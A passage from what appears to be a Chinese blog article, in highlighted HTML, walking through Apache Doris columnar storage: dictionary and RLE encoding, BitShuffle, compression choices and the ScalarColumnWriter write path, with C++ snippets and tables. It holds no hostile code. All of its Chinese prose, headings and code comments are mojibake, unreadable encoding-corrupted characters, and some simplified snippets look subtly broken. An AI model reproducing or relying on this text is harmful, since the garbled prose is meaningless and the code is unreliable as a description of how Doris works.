<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>
<span class="hljs-operator">|</span> num_values (<span class="hljs-number">4</span> bytes)  <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>
<span class="hljs-operator">|</span> index[<span class="hljs-number">0</span>]              <span class="hljs-operator">|</span>  â† å­—å…¸ç´¢å¼•ï¼ˆuint32 æˆ–æ›´å°ï¼‰
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>
<span class="hljs-operator">|</span> index[<span class="hljs-number">1</span>]              <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>
<span class="hljs-operator">|</span>        ...            <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>
<span class="hljs-operator">|</span> index[n<span class="hljs-number">-1</span>]            <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>
</code></pre>
<h4 data-id="heading-21">å†™å…¥æµç¨‹</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">template</span> &lt;FieldType Type&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BinaryDictPageBuilder</span> {
<span class="hljs-keyword">private</span>:
    <span class="hljs-comment">// å­—å…¸ï¼švalue -&gt; code</span>
    std::unordered_map&lt;Slice, <span class="hljs-type">uint32_t</span>, SliceHash&gt; _dictionary;
    <span class="hljs-comment">// æ•°æ®é¡µï¼šå­˜å‚¨ code åˆ—è¡¨</span>
    std::vector&lt;<span class="hljs-type">uint32_t</span>&gt; _data_codes;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">Status <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* vals, <span class="hljs-type">size_t</span>* count)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-type">const</span> Slice* slices = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> Slice*&gt;(vals);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; *count; i++) {
            <span class="hljs-keyword">auto</span> it = _dictionary.<span class="hljs-built_in">find</span>(slices[i]);
            <span class="hljs-type">uint32_t</span> code;
            <span class="hljs-keyword">if</span> (it != _dictionary.<span class="hljs-built_in">end</span>()) {
                <span class="hljs-comment">// å·²å­˜åœ¨çš„å€¼ï¼Œä½¿ç”¨ç°æœ‰ code</span>
                code = it-&gt;second;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// æ–°å€¼ï¼Œåˆ†é…æ–° code</span>
                code = _dictionary.<span class="hljs-built_in">size</span>();
                _dictionary.<span class="hljs-built_in">emplace</span>(slices[i], code);
                <span class="hljs-comment">// å­—å…¸æº¢å‡ºæ£€æŸ¥</span>
                <span class="hljs-keyword">if</span> (_dictionary.<span class="hljs-built_in">size</span>() &gt; MAX_DICT_SIZE) {
                    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">InternalError</span>(<span class="hljs-string">"Dictionary too large"</span>);
                }
            }
            _data_codes.<span class="hljs-built_in">push_back</span>(code);
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">get_dictionary_page</span><span class="hljs-params">(OwnedSlice* dict_page)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// å­—å…¸æŒ‰ code æ’åº</span>
        <span class="hljs-function">std::vector&lt;Slice&gt; <span class="hljs-title">sorted_dict</span><span class="hljs-params">(_dictionary.size())</span></span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; kv : _dictionary) {
            sorted_dict[kv.second] = kv.first;
        }
        <span class="hljs-comment">// ä½¿ç”¨ Plain Encoding ç¼–ç å­—å…¸</span>
        PlainPageBuilder&lt;OLAP_FIELD_TYPE_VARCHAR&gt; dict_builder;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; value : sorted_dict) {
            dict_builder.<span class="hljs-built_in">add</span>((<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*)&amp;value, <span class="hljs-number">1</span>);
        }
        <span class="hljs-keyword">return</span> dict_builder.<span class="hljs-built_in">finish</span>(dict_page);
    }
    
    <span class="hljs-function">Status <span class="hljs-title">finish</span><span class="hljs-params">(OwnedSlice* data_page)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// ç¼–ç  code åˆ—è¡¨</span>
        faststring buf;
        <span class="hljs-built_in">encode_fixed32_le</span>(&amp;buf[<span class="hljs-number">0</span>], _data_codes.<span class="hljs-built_in">size</span>());
        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> code : _data_codes) {
            <span class="hljs-built_in">put_fixed32_le</span>(&amp;buf, code);
        }
        *data_page = buf.<span class="hljs-built_in">build</span>();
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
};
</code></pre>
<h4 data-id="heading-22">è¯»å–æµç¨‹</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">template</span> &lt;FieldType Type&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BinaryDictPageDecoder</span> {
<span class="hljs-keyword">private</span>:
    <span class="hljs-comment">// å­—å…¸å€¼åˆ—è¡¨</span>
    std::vector&lt;Slice&gt; _dict_values;
    <span class="hljs-comment">// code åˆ—è¡¨</span>
    std::vector&lt;<span class="hljs-type">uint32_t</span>&gt; _data_codes;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">Status <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// 1. è§£ç å­—å…¸é¡µ</span>
        <span class="hljs-function">PlainPageDecoder&lt;OLAP_FIELD_TYPE_VARCHAR&gt; <span class="hljs-title">dict_decoder</span><span class="hljs-params">(_dict_page_data)</span></span>;
        dict_decoder.<span class="hljs-built_in">init</span>();
        _dict_values.<span class="hljs-built_in">resize</span>(_dict_size);
        dict_decoder.<span class="hljs-built_in">next_batch</span>(&amp;_dict_size, &amp;_dict_values);
        
        <span class="hljs-comment">// 2. è§£ç æ•°æ®é¡µ</span>
        _num_values = <span class="hljs-built_in">decode_fixed32_le</span>((<span class="hljs-type">uint8_t</span>*)_data.data);
        _data_codes.<span class="hljs-built_in">resize</span>(_num_values);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; _num_values; i++) {
            _data_codes[i] = <span class="hljs-built_in">decode_fixed32_le</span>((<span class="hljs-type">uint8_t</span>*)_data.data + <span class="hljs-number">4</span> + i * <span class="hljs-number">4</span>);
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">next_batch</span><span class="hljs-params">(<span class="hljs-type">size_t</span>* n, ColumnBlockView* dst)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-type">size_t</span> to_read = std::<span class="hljs-built_in">min</span>(*n, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">size_t</span>&gt;(_num_values - _cur_idx));
        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; to_read; i++) {
            <span class="hljs-type">uint32_t</span> code = _data_codes[_cur_idx + i];
            <span class="hljs-comment">// ä»å­—å…¸æŸ¥æ‰¾çœŸå®å€¼</span>
            dst-&gt;<span class="hljs-built_in">set_value</span>(i, _dict_values[code]);
        }
        _cur_idx += to_read;
        *n = to_read;
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
};
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>å­—ç¬¦ä¸²ç±»å‹ï¼ˆVARCHAR, CHARï¼‰</li>
<li>é‡å¤å€¼å¤šï¼ˆä½åŸºæ•°ï¼‰</li>
<li>å…¸å‹åœºæ™¯ï¼šçŠ¶æ€åˆ—ã€åœ°åŒºåˆ—ã€ç±»ç›®åˆ—</li>
</ul>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>å¤§å¹…é™ä½å­˜å‚¨ç©ºé—´ï¼ˆå­—å…¸å¤§å° &lt;&lt; åŸå§‹æ•°æ®ï¼‰</li>
<li>æé«˜ I/O æ•ˆç‡</li>
<li>å­—å…¸å¯ä»¥é¢„åŠ è½½åˆ°å†…å­˜</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>å­—å…¸æº¢å‡ºæ—¶é€€åŒ–ä¸º Plain Encoding</li>
<li>éœ€è¦é¢å¤–çš„å­—å…¸é¡µå­˜å‚¨</li>
</ul>
<hr/>
<h3 data-id="heading-23">4.4 RLE (Run-Length Encoding)</h3>
<p><strong>æ¸¸ç¨‹ç¼–ç å°†è¿ç»­é‡å¤çš„å€¼å‹ç¼©ä¸º (value, run_length) å¯¹</strong>ã€‚</p>
<h4 data-id="heading-24">ç¼–ç æ ¼å¼</h4>
<pre><code class="hljs language-lua" lang="lua">+<span class="hljs-comment">-----------------------+</span>
| run[<span class="hljs-number">0</span>]: (val, <span class="hljs-built_in">len</span>)    |  â† ç¬¬ä¸€ä¸ªæ¸¸ç¨‹
+<span class="hljs-comment">-----------------------+</span>
| run[<span class="hljs-number">1</span>]: (val, <span class="hljs-built_in">len</span>)    |
+<span class="hljs-comment">-----------------------+</span>
|        ...            |
+<span class="hljs-comment">-----------------------+</span>
| run[n<span class="hljs-number">-1</span>]: (val, <span class="hljs-built_in">len</span>)  |
+<span class="hljs-comment">-----------------------+</span>
</code></pre>
<h4 data-id="heading-25">å®ç°ç¤ºä¾‹ï¼ˆNULL ä½å›¾ï¼‰</h4>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>column_writer.cpp:55-89</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NullBitmapBuilder</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">NullBitmapBuilder</span>() : _has_null(<span class="hljs-literal">false</span>), _bitmap_buf(<span class="hljs-number">512</span>), _rle_encoder(&amp;_bitmap_buf, <span class="hljs-number">1</span>) {}
    
    <span class="hljs-comment">// æ·»åŠ ä¸€ä¸ªæ¸¸ç¨‹ï¼švalue é‡å¤ run æ¬¡</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_run</span><span class="hljs-params">(<span class="hljs-type">bool</span> value, <span class="hljs-type">size_t</span> run)</span> </span>{
        _has_null |= value;
        _rle_encoder.<span class="hljs-built_in">Put</span>(value, run);  <span class="hljs-comment">// RLE ç¼–ç </span>
    }
    
    <span class="hljs-function">Status <span class="hljs-title">finish</span><span class="hljs-params">(OwnedSlice* slice)</span> </span>{
        _rle_encoder.<span class="hljs-built_in">Flush</span>();
        *slice = _bitmap_buf.<span class="hljs-built_in">build</span>();
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">bool</span> _has_null;
    faststring _bitmap_buf;
    RleEncoder&lt;<span class="hljs-type">bool</span>&gt; _rle_encoder;  <span class="hljs-comment">// RLE ç¼–ç å™¨</span>
};
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>NULL ä½å›¾ï¼ˆå¤§é‡è¿ç»­çš„ 0 æˆ– 1ï¼‰</li>
<li>æ’åºåˆ—ï¼ˆè¿ç»­é‡å¤å€¼ï¼‰</li>
<li>æ ‡å¿—ä½åˆ—</li>
</ul>
<hr/>
<h3 data-id="heading-26">4.5 BitShuffle Encoding</h3>
<p><strong>ä½é‡æ’ç¼–ç é€šè¿‡é‡æ–°ç»„ç»‡æ•°æ®çš„ä½é¡ºåºæ¥æé«˜å‹ç¼©ç‡</strong>ã€‚</p>
<h4 data-id="heading-27">åŸç†</h4>
<p>ä¼ ç»Ÿå­˜å‚¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">value<span class="hljs-selector-attr">[0]</span> = <span class="hljs-number">0</span>x12345678  â†’  <span class="hljs-selector-attr">[78 56 34 12]</span>
value<span class="hljs-selector-attr">[1]</span> = <span class="hljs-number">0</span>x12345679  â†’  <span class="hljs-selector-attr">[79 56 34 12]</span>
value<span class="hljs-selector-attr">[2]</span> = <span class="hljs-number">0</span>x1234567A  â†’  <span class="hljs-selector-attr">[7A 56 34 12]</span>
</code></pre>
<p>BitShuffle åï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Byte 0: <span class="hljs-section">[78, 79, 7A, ...]</span>  â† æ‰€æœ‰å€¼çš„ç¬¬ 0 å­—èŠ‚
Byte 1: <span class="hljs-section">[56, 56, 56, ...]</span>  â† æ‰€æœ‰å€¼çš„ç¬¬ 1 å­—èŠ‚ï¼ˆé«˜åº¦ç›¸ä¼¼ï¼ï¼‰
Byte 2: <span class="hljs-section">[34, 34, 34, ...]</span>
Byte 3: <span class="hljs-section">[12, 12, 12, ...]</span>
</code></pre>
<p>å°†ç›¸åŒä½ç½®çš„å­—èŠ‚èšé›†åï¼Œç›¸é‚»å­—èŠ‚çš„ç›¸ä¼¼åº¦å¤§å¹…æé«˜ï¼Œå†ä½¿ç”¨é€šç”¨å‹ç¼©ç®—æ³•ï¼ˆLZ4/ZSTDï¼‰å¯ä»¥è·å¾—æ›´å¥½çš„å‹ç¼©ç‡ã€‚</p>
<h4 data-id="heading-28">é¢„è§£ç ä¼˜åŒ–</h4>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>encoding_info.h:44-50</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// BitShuffle éœ€è¦é¢„è§£ç æ‰èƒ½åŠ å…¥ PageCache</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataPagePreDecoder</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> Status <span class="hljs-title">decode</span><span class="hljs-params">(std::unique_ptr&lt;DataPage&gt;* page, Slice* page_slice, <span class="hljs-type">size_t</span> size_of_tail,
                          <span class="hljs-type">bool</span> _use_cache, segment_v2::PageTypePB page_type,
                          <span class="hljs-type">const</span> std::string&amp; file_path, <span class="hljs-type">size_t</span> size_of_prefix = <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0</span>;
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">DataPagePreDecoder</span>() = <span class="hljs-keyword">default</span>;
};
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>æ•°å€¼ç±»å‹ï¼ˆINT, BIGINT, DOUBLEï¼‰</li>
<li>æ•°æ®åˆ†å¸ƒè¾ƒä¸ºå‡åŒ€</li>
<li>é…åˆ LZ4/ZSTD å‹ç¼©æ•ˆæœæ˜¾è‘—</li>
</ul>
<hr/>
<h3 data-id="heading-29">4.6 ç¼–ç é€‰æ‹©ç­–ç•¥</h3>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>encoding_info.h:58-59</code></a></p>
<p>Doris ä¼šæ ¹æ®æ•°æ®ç±»å‹å’ŒæŸ¥è¯¢æ¨¡å¼è‡ªåŠ¨é€‰æ‹©ç¼–ç ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">static</span> EncodingTypePB <span class="hljs-title">get_default_encoding</span><span class="hljs-params">(FieldType type, <span class="hljs-type">bool</span> optimize_value_seek)</span></span>;
</code></pre>








































<table><thead><tr><th>æ•°æ®ç±»å‹</th><th>é»˜è®¤ç¼–ç </th><th>å¤‡é€‰ç¼–ç </th></tr></thead><tbody><tr><td>INT/BIGINT</td><td>BIT_SHUFFLE</td><td>PLAIN, FOR_ENCODING</td></tr><tr><td>DOUBLE/FLOAT</td><td>BIT_SHUFFLE</td><td>PLAIN</td></tr><tr><td>VARCHAR/CHAR</td><td>DICT_ENCODING</td><td>PLAIN, PREFIX_ENCODING</td></tr><tr><td>DATE/DATETIME</td><td>BIT_SHUFFLE</td><td>PLAIN</td></tr><tr><td>DECIMAL</td><td>BIT_SHUFFLE</td><td>PLAIN</td></tr><tr><td>BOOLEAN</td><td>RLE</td><td>PLAIN</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-30">5. åˆ—å‹ç¼©</h2>
<h3 data-id="heading-31">5.1 å‹ç¼©ç±»å‹</h3>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:46-56</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">enum CompressionTypePB {
    UNKNOWN_COMPRESSION = 0;
    DEFAULT_COMPRESSION = 1;
    NO_COMPRESSION = 2;
    SNAPPY = 3;
    LZ4 = 4;
    LZ4F = 5;
    ZLIB = 6;
    ZSTD = 7;
    LZ4HC = 8;
}
</code></pre>
<h3 data-id="heading-32">5.2 å‹ç¼©æµç¨‹</h3>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>page_io.cpp:52-72</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">Status <span class="hljs-title">PageIO::compress_page_body</span><span class="hljs-params">(BlockCompressionCodec* codec, <span class="hljs-type">double</span> min_space_saving,
                                  <span class="hljs-type">const</span> std::vector&lt;Slice&gt;&amp; body, OwnedSlice* compressed_body)</span> </span>{
    <span class="hljs-type">size_t</span> uncompressed_size = Slice::<span class="hljs-built_in">compute_total_size</span>(body);
    <span class="hljs-keyword">if</span> (codec != <span class="hljs-literal">nullptr</span> &amp;&amp; !codec-&gt;<span class="hljs-built_in">exceed_max_compress_len</span>(uncompressed_size)) {
        faststring buf;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(codec-&gt;<span class="hljs-built_in">compress</span>(body, uncompressed_size, &amp;buf));
        
        <span class="hljs-comment">// è®¡ç®—å‹ç¼©ç‡</span>
        <span class="hljs-type">double</span> space_saving =
                <span class="hljs-number">1.0</span> - (<span class="hljs-built_in">cast_set</span>&lt;<span class="hljs-type">double</span>&gt;(buf.<span class="hljs-built_in">size</span>()) / <span class="hljs-built_in">cast_set</span>&lt;<span class="hljs-type">double</span>&gt;(uncompressed_size));
        
        <span class="hljs-comment">// åªæœ‰å‹ç¼©ç‡è¾¾åˆ°é˜ˆå€¼æ‰ä½¿ç”¨å‹ç¼©</span>
        <span class="hljs-keyword">if</span> (space_saving &gt; <span class="hljs-number">0</span> &amp;&amp; space_saving &gt;= min_space_saving) {
            *compressed_body = buf.<span class="hljs-built_in">build</span>();
            <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
        }
    }
    <span class="hljs-comment">// å¦åˆ™ä¸å‹ç¼©</span>
    OwnedSlice empty;
    *compressed_body = std::<span class="hljs-built_in">move</span>(empty);
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}
</code></pre>
<h3 data-id="heading-33">5.3 å‹ç¼©ç®—æ³•å¯¹æ¯”</h3>





























































<table><thead><tr><th>ç®—æ³•</th><th>å‹ç¼©ç‡</th><th>å‹ç¼©é€Ÿåº¦</th><th>è§£å‹é€Ÿåº¦</th><th>CPU å ç”¨</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>LZ4</strong></td><td>ä¸­</td><td>æå¿«</td><td>æå¿«</td><td>ä½</td><td>é»˜è®¤é€‰æ‹©ï¼Œå‡è¡¡</td></tr><tr><td><strong>LZ4F</strong></td><td>ä¸­</td><td>å¿«</td><td>å¿«</td><td>ä½</td><td>LZ4 çš„æµå¼ç‰ˆæœ¬</td></tr><tr><td><strong>LZ4HC</strong></td><td>ä¸­é«˜</td><td>æ…¢</td><td>æå¿«</td><td>é«˜</td><td>å†™å°‘è¯»å¤š</td></tr><tr><td><strong>ZSTD</strong></td><td>é«˜</td><td>ä¸­</td><td>å¿«</td><td>ä¸­</td><td>å­˜å‚¨ç©ºé—´æ•æ„Ÿ</td></tr><tr><td><strong>SNAPPY</strong></td><td>ä½</td><td>æå¿«</td><td>æå¿«</td><td>ä½</td><td>å·²è¿‡æ—¶ï¼Œä¸æ¨è</td></tr><tr><td><strong>ZLIB</strong></td><td>é«˜</td><td>æ…¢</td><td>æ…¢</td><td>é«˜</td><td>å·²è¿‡æ—¶ï¼Œä¸æ¨è</td></tr></tbody></table>
<p><strong>æ¨èé…ç½®</strong>ï¼š</p>
<ul>
<li><strong>é»˜è®¤</strong>ï¼šLZ4ï¼ˆé€Ÿåº¦ä¸å‹ç¼©ç‡çš„æœ€ä½³å¹³è¡¡ï¼‰</li>
<li><strong>é«˜å‹ç¼©ç‡</strong>ï¼šZSTDï¼ˆé€‚åˆå†·æ•°æ®ï¼‰</li>
<li><strong>æè‡´é€Ÿåº¦</strong>ï¼šNO_COMPRESSIONï¼ˆé…åˆ BitShuffleï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-34">6. ColumnWriter å†™å…¥æµç¨‹</h2>
<h3 data-id="heading-35">6.1 ColumnWriter ç±»å±‚æ¬¡</h3>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>column_writer.h</code></a></p>
<pre><code class="hljs language-scss" lang="scss">ColumnWriter (æŠ½è±¡åŸºç±»)
    â”œâ”€â”€ ScalarColumnWriter          â† æ ‡é‡ç±»å‹
    â”œâ”€â”€ ArrayColumnWriter           â† æ•°ç»„ç±»å‹
    â”‚   â”œâ”€â”€ OffsetColumnWriter      â† åç§»é‡åˆ—
    â”‚   â”œâ”€â”€ ItemColumnWriter        â† å…ƒç´ åˆ—
    â”‚   â””â”€â”€ NullColumnWriter (opt)  â† NULL åˆ—
    â”œâ”€â”€ MapColumnWriter             â† Map ç±»å‹
    â”œâ”€â”€ StructColumnWriter          â† Struct ç±»å‹
    â””â”€â”€ VariantColumnWriter         â† Variant ç±»å‹
</code></pre>
<h3 data-id="heading-36">6.2 ScalarColumnWriter å†™å…¥æµç¨‹</h3>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>column_writer.cpp:408-763</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ScalarColumnWriter</span> : <span class="hljs-keyword">public</span> ColumnWriter {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">Status <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// 1. åˆ›å»ºå‹ç¼©ç¼–è§£ç å™¨</span>
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">get_block_compression_codec</span>(_opts.meta-&gt;<span class="hljs-built_in">compression</span>(), &amp;_compress_codec));
        
        <span class="hljs-comment">// 2. åˆ›å»ºç¼–ç å™¨</span>
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(EncodingInfo::<span class="hljs-built_in">get</span>(<span class="hljs-built_in">get_field</span>()-&gt;<span class="hljs-built_in">type</span>(), _opts.meta-&gt;<span class="hljs-built_in">encoding</span>(), 
                                          &amp;_encoding_info));
        
        <span class="hljs-comment">// 3. åˆ›å»º Page Builder</span>
        PageBuilderOptions opts;
        opts.data_page_size = _opts.data_page_size;  <span class="hljs-comment">// é»˜è®¤ 64KB</span>
        opts.dict_page_size = _opts.dict_page_size;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(_encoding_info-&gt;<span class="hljs-built_in">create_page_builder</span>(opts, &amp;page_builder));
        _page_builder.<span class="hljs-built_in">reset</span>(page_builder);
        
        <span class="hljs-comment">// 4. åˆ›å»ºç´¢å¼• Builder</span>
        _ordinal_index_builder = std::<span class="hljs-built_in">make_unique</span>&lt;OrdinalIndexWriter&gt;();
        <span class="hljs-keyword">if</span> (_opts.need_zone_map) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(ZoneMapIndexWriter::<span class="hljs-built_in">create</span>(<span class="hljs-built_in">get_field</span>(), _zone_map_index_builder));
        }
        <span class="hljs-keyword">if</span> (_opts.need_bitmap_index) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(BitmapIndexWriter::<span class="hljs-built_in">create</span>(<span class="hljs-built_in">get_field</span>()-&gt;<span class="hljs-built_in">type_info</span>(), 
                                                     &amp;_bitmap_index_builder));
        }
        <span class="hljs-keyword">if</span> (_opts.need_bloom_filter) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(BloomFilterIndexWriter::<span class="hljs-built_in">create</span>(_opts.bf_options, 
                                                           <span class="hljs-built_in">get_field</span>()-&gt;<span class="hljs-built_in">type_info</span>(), 
                                                           &amp;_bloom_filter_index_builder));
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// æ·»åŠ æ•°æ®</span>
    <span class="hljs-function">Status <span class="hljs-title">append_data</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>** ptr, <span class="hljs-type">size_t</span> num_rows)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-type">size_t</span> remaining = num_rows;
        <span class="hljs-keyword">while</span> (remaining &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-type">size_t</span> num_written = remaining;
            <span class="hljs-comment">// æ·»åŠ åˆ°å½“å‰ Page</span>
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">append_data_in_current_page</span>(ptr, &amp;num_written));
            remaining -= num_written;
            
            <span class="hljs-comment">// Page æ»¡äº†ï¼Œå†™å…¥æ–‡ä»¶</span>
            <span class="hljs-keyword">if</span> (_page_builder-&gt;<span class="hljs-built_in">is_page_full</span>()) {
                <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">finish_current_page</span>());
            }
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">append_data_in_current_page</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>** data, <span class="hljs-type">size_t</span>* num_written)</span> </span>{
        <span class="hljs-comment">// 1. æ·»åŠ åˆ° Page Builder</span>
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(_page_builder-&gt;<span class="hljs-built_in">add</span>(*data, num_written));
        
        <span class="hljs-comment">// 2. æ›´æ–°ç´¢å¼•</span>
        <span class="hljs-keyword">if</span> (_opts.need_bitmap_index) {
            _bitmap_index_builder-&gt;<span class="hljs-built_in">add_values</span>(*data, *num_written);
        }
        <span class="hljs-keyword">if</span> (_opts.need_zone_map) {
            _zone_map_index_builder-&gt;<span class="hljs-built_in">add_values</span>(*data, *num_written);
        }
        <span class="hljs-keyword">if</span> (_opts.need_bloom_filter) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(_bloom_filter_index_builder-&gt;<span class="hljs-built_in">add_values</span>(*data, *num_written));
        }
        
        _next_rowid += *num_written;
        
        <span class="hljs-comment">// 3. æ·»åŠ  NULL ä½å›¾</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_nullable</span>()) {
            _null_bitmap_builder-&gt;<span class="hljs-built_in">add_run</span>(<span class="hljs-literal">false</span>, *num_written);
        }
        
        *data += <span class="hljs-built_in">get_field</span>()-&gt;<span class="hljs-built_in">size</span>() * (*num_written);
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// å®Œæˆå½“å‰ Page</span>
    <span class="hljs-function">Status <span class="hljs-title">finish_current_page</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">if</span> (_next_rowid == _first_rowid) {
            <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();  <span class="hljs-comment">// ç©º Page</span>
        }
        
        <span class="hljs-comment">// 1. å®Œæˆç´¢å¼•</span>
        <span class="hljs-keyword">if</span> (_opts.need_zone_map) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(_zone_map_index_builder-&gt;<span class="hljs-built_in">flush</span>());
        }
        <span class="hljs-keyword">if</span> (_opts.need_bloom_filter) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(_bloom_filter_index_builder-&gt;<span class="hljs-built_in">flush</span>());
        }
        
        <span class="hljs-comment">// 2. å®Œæˆ Page Builderï¼Œè·å–ç¼–ç åçš„æ•°æ®</span>
        std::vector&lt;Slice&gt; body;
        OwnedSlice encoded_values;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(_page_builder-&gt;<span class="hljs-built_in">finish</span>(&amp;encoded_values));
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(_page_builder-&gt;<span class="hljs-built_in">reset</span>());
        body.<span class="hljs-built_in">push_back</span>(encoded_values.<span class="hljs-built_in">slice</span>());
        
        <span class="hljs-comment">// 3. æ·»åŠ  NULL ä½å›¾</span>
        OwnedSlice nullmap;
